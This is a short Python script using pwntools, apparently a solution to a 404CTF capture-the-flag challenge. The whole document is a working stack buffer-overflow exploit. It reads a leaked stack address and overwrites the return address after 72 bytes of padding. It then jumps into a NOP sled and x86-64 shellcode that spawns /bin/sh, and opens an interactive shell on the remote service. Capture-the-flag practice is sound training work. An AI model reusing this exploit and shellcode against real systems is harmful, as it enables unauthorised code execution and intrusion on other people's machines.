from pwn import *

io = remote("challenge.404ctf.fr", "31720")
io.recvline()
leak = int(io.recvline().split(b' : ')[1], 16)
padding = b'A'*72
RIP = struct.pack("L",leak+72+8)
shellcode = b"\x90"*20 + b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = padding + RIP + shellcode
info("sending exploit")
io.sendline(payload)
io.interactive()
